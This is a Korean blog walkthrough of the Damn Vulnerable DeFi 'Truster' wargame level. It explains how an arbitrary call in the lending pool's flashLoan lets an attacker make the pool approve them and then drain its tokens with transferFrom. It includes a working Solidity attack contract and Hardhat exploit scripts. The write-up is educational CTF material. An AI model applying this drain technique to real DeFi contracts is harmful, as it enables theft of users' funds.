---
title: "DamnVulnerableDefi Truster 풀이"
author: Grizzly
categories:
  - Wargame
tags:
  - DamnVulnerableDefi
  - Truster

sitemap :
changefreq : daily
priority : 1.0
# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
---

## Overview
이 워게임에 대한 배경은 `Naive receiver` 문제에서 다뤘기 때문에 생략하고, 곧 바로 이 문제에 대해 서술해 본다.

이 문제에서는 1개의 컨트랙트 (`TrusterLenderPool.sol`)가 주어지고, 이 컨트랙트의 초기 자본은 `1000000 ether`로 설정되어 있다. 이 문제의 목표는 ***공격자가 `TrusterLenderPool`의 `1000000 ether`를 모두 탈취하는 것이다.***

## 컨트랙트 분석

### TrusterLenderPool
~~~Solidity
  ...
  function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
  ...
~~~
언젠가 컨트랙트의 코드가 복잡해지면 이렇게 분석하지도 못하겠지만, 일단 `flashLoan` 함수의 동작을 순차적으로 기술해본다.
1. 대출 금액(`borrowAmount`), 채무자 주소(`borrower`), 타겟 주소(`target`), low-level calldata(`data`)를 매개변수로 전달 받는다.
2. 대출전 컨트랙트의 잔액(`balanceBefore`)이 대출 금액(`borrowAmount`)보다 큰지 확인한다.
3. 채무자(`borrower`)에게 대출금액(`borrowAmount`) 만큼 전송한다.
4. calldata(`data`)를 이용해 타겟(`target`)의 *임의의 함수*를 호출한다.
5. 상환 후 잔액(`balanceAfter`)을 대출 전(`balanceBefore`)과 비교한다.


## Solution
개인적으로 이 문제가 굉장히 어렵게 느껴졌는데, 여기에는 크게 2가지 이유가 있었다.
1. flashLoan 문제다 보니, 모든 것을 1 tx에 해야한다는 강박관념.
2. ERC20 함수에 대한 잘 못된 이해.

이 문제의 포인트는 누가봐도 이상한 이 문장이다: `target.functionCall(data);`. `functionCall`은 openZepplin에서 개발한 `Utilities` 라이브러리에 다음과 같은 형태로 구현되어 있다.

* `functionCall(address, bytes)` in `@openzepplin/contracts/utils`
~~~Solidity
function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, "Address: low-level call failed");
}
~~~

* `functionCall(address, bytes, string)` in `@openzepplin/contracts/utils`
~~~Solidity
function functionCall(
    address target,
    bytes memory data,
    string memory errorMessage
) internal returns (bytes memory) {
    return functionCallWithValue(target, data, 0, errorMessage);
}
~~~

* `functionCallWithValue(address, bytes, uint256, string)` in `@openzepplin/contracts/utils`
~~~Solidity
function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value,
    string memory errorMessage
) internal returns (bytes memory) {
    require(address(this).balance >= value, "Address: insufficient balance for call");
    require(isContract(target), "Address: call to non-contract");

    (bool success, bytes memory returndata) = target.call{value: value}(data);
    return verifyCallResult(success, returndata, errorMessage);
}
~~~

`functionCall`은 결과적으로 `target`의 임의의 함수를 Solidity의 low-level `call`로 호출한다. 실제로 openZepplin의 공식 문서에도 동일한 내용이 적혀있다.
여기에서 호출될 함수는 `data`에 abi 인코딩되어 있다. 따라서, 우리는 `target` 컨트랙트의 임의의 함수를 (abi 인코딩해서) 호출할 수 있다 (따라서, `target`은 당연히 컨트랙트일 것이다).

*전통적인 보안 취약점에서와 마찬가지로 공격자로하여금 원하는 함수를 호출할 수 있게 하는 것은 매우 위험하다.*

이제 익스플로잇 시나리오를 생각해보자. `target.functionCall(data)`를 이용해야 하는 것을 알겠는데, 이것으로 무엇을 해야하는가 이다. `flashLoan` 함수를 보면 `transfer`와 `functionCall` 전후로 잔액을 체크하고 있다. 따라서 생각할 수 있는 방법은 2가지이다.
1. `trasfer`를 어느 정도 ether를 전송했다면, `functionCall`을 통해서 동일하거나 그 이상의 금액을 회신받아야 한다. 이 경우, `functionCall`로 할 수 있는 것이 제한될 것이다.
2. `trasfer`로 ether를 전혀 전송하지 않는다. 이 경우, `functionCall`로 할 수 있는 행동에 제한이 없다.

당연히 2번째 케이스를 이용하는 것이 편할 것이다. 여기에서 functionCall로 공격자에게 `TrusterLenderPool`가 가지고 있는 `1000000 ether`를 전송하려 한다면 매우 고달파 질 것이다. 잔액체크를 우회할 방법이 없기 때문이다. 그렇다면, 생각할 수 있는 것은 `functionCall`로 밑밥을 깔아놓고, `flashLoan` 함수가 정상적으로 끝난 다음에 돈을 빼가는 것이다.

ERC20를 접해본적이 있다면, 느낌이 올 것이다. 바로 `approve`/`transferFrom`를 이용하는 것이다. 여기에서 개인적으로 이 문제가 어려웠던 2번째 이유가 문제가 됐다. `approve`와 `transferFrom` 두 함수에 대한 이해가 모두 잘 못 돼있었다. 이해가 올바르다면, 이 부분은 스킵해도 좋다.
* `approve`: `msg.sender`(owner)가 가진 잔액을 `spender`가 `amount` 한도 내에서 사용할 수 있게 함.
* `transferFrom`: `sender`가 가진 잔액을 `recipient`에게 `amount`만큼 전송. 이때, *이 함수의 caller에게 주어진 `allowance`에서 `amount`가 공제됨.*

`transferFrom`를 사용할 때, 주의할 점은 바로 이것이다. 이 함수를 호출한 자에 대해 ether를 전송할 수 있도록 허용되어 있어야 한다. `sender`도 아니고, `recipent`도 아니다 (`sender`는 `msg.sender`가 아니다). 당연하게도 이러한 권리는 `approve`에 의해 승인된다. 

이제 이 두 함수의 관계를 이용해 익스플로잇을 작성해보자. `approve`에서 `msg.sender`가 `allowance`의 owner이다. 따라서, 이 함수를 호출하는 caller는 `TrusterLenderPool`가 되어야 한다. 그리고 `spender`는 `transferFrom`의 caller가 되어야 한다 (`amount`는 당연히 `1000000 ether`). 이유는 우리는 `flashLoan` 함수가 종료된 다음에 돈을 빼돌려야하기 때문이다. 여기에서 다시 2가지 풀이가 있을 수 있다: 컨트랙트를 작성해서 푸는 방법과 Javascript만으로 푸는 방법.

1. 컨트랙트를 이용하는 방법
* Attack.sol
~~~Solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract Attack {

    constructor() {

    }

    function attack(address pool, address token, address attacker) public {
        
        TrusterLenderPool(pool).flashLoan(
            0,
            attacker,
            token,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this), 1000000 ether
            )
        );

        IERC20(token).transferFrom(
            pool, attacker, 1000000 ether
        );
    }
}
~~~

* 익스플로잇 Javscript 코드
~~~Javascript
  ...
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const AttackContract = await ethers.getContractFactory("Attack");
    this.attackContract = await AttackContract.deploy();

    await this.attackContract.attack(
        this.pool.address, 
        this.token.address,
        attacker.address);
  });
  ...
~~~

2. Javascript만 이용하는 방법
~~~Javascript
  ...
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const data = web3.eth.abi.encodeFunctionCall({
        name: 'approve',
        type: 'function',
        inputs: [{
            type: 'address',
            name: 'spender'
        }, {
            type:'uint256',
            name: 'amount'
        }]
    }, [attacker.address, TOKENS_IN_POOL]);
    await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
  });
  ...
~~~
이 방법으로 할 때에는 익스플로잇 Javascript에서 web3.js를 사용할 수 있도록 해야 한다. 방법은 다음과 같다.
~~~Bash
# Damn Vulnerable Defi 프로젝트의 root 디렉토리에서
$ npm install --save-dev @nomiclabs/hardhat-web3
~~~
그 다음 `hardhat.config.js`에 아래와 같이 `require` 문장을 추가한다.
~~~Javascript
require("@nomiclabs/hardhat-waffle");
require('@nomiclabs/hardhat-web3'); // 이거
require('@openzeppelin/hardhat-upgrades');
require('hardhat-dependency-compiler');
~~~

***EZ*** (...?)